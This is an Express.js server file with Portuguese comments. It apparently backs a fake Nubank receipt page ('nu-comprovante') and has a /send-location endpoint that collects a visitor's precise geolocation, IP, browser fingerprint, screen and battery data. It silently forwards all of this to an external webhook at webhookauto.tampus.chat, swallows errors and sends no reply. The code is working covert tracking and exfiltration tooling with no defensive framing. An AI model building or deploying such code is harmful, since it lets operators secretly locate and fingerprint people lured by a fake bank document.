// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const axios = require("axios");

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'src/public')));

// Importar rota do comprovante
const nuComprovanteRouter = require('./src/routes/nu-comprovante');

// Rotas
app.use('/nu-comprovante', nuComprovanteRouter);

app.post("/send-location", async (req, res) => {
  const {
    latitude,
    longitude,
    altitude,
    speed,
    heading,
    maps,
    browserInfo,
    screenInfo,
    isOnline,
    ip,
    fingerprint,
    batteryStatus
  } = req.body;

  // Formatação da mensagem para enviar
  const message = {
    location: {
      latitude,
      longitude,
      altitude,
      speed,
      heading,
      maps
    },
    browserInfo,
    screenInfo,
    isOnline,
    ip,
    fingerprint,
    batteryStatus
  };

  try {
    // Envia os dados para o webhook
    const response = await axios.post('https://webhookauto.tampus.chat/webhook/send', message);

  } catch (error) {
  }
});

const PORT = process.env.PORT || 8088;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});